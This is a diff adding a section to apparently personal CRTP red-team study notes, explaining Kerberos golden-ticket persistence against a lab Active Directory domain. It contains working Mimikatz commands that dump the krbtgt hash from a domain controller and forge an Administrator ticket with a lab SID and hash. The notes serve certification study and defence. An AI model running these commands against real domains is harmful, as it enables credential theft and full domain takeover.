@@ -203,3 +203,20 @@ and then offline brute-forcing the ticket to obtain the service account's plaint
 - Clients (programs on behalf of a user) need to obtain tickets from Key Distribution Center (KDC) which is a service running on the domain
   controller. These tickets represent the client's credentials.!
 - Therefore, Kerberos is understandably a very interesting target of abuse!
+![image](https://github.com/7arbeyx01/CRTP_Notes/assets/18347638/07b4ffd7-a81f-4b43-8d66-7cb15104b1ea)
+
+# Persistence - Golden Ticket
+- A golden ticket is signed and encrypted by the hash of krbtgt account which makes it a valid TGT ticket.
+- Since user account validation is not done by Domain Controller (KDC service) until TGT is older than 20 minutes, we can use even
+  deleted/revoked accounts.
+- The krbtgt user hash could be used to impersonate any user with any privileges from even a non-domain machine.
+- As a good practice, it is recommended to change the password of the krbtgt account twice as password history is maintained for the account.
+![image](https://github.com/7arbeyx01/CRTP_Notes/assets/18347638/a041ea38-f435-4ae4-ac6d-33bef24758b7)
+
+- Execute mimikatz on DC as DA to get krbtgt hash<br>
+```Invoke-Mimikatz -Command '"lsadump::lsa /patch"' –Computername dcorp-dc```
+- On any machine<br>
+```Invoke-Mimikatz -Command '"kerberos::golden/User:Administrator /domain:dollarcorp.moneycorp.local/sid:S-1-5-21-1874506631-3219952063-538504511/krbtgt:ff46a9d8bd66c6efd77603da26796f35 id:500/groups:512 /startoffset:0 /endin:600 /renewmax:10080/ptt"'```
+
+![image](https://github.com/7arbeyx01/CRTP_Notes/assets/18347638/042218d8-45fa-46a8-a261-f76a6ce95feb)
+![image](https://github.com/7arbeyx01/CRTP_Notes/assets/18347638/b52d9832-fc5c-4ad4-9bb1-d6e42738e4fd)
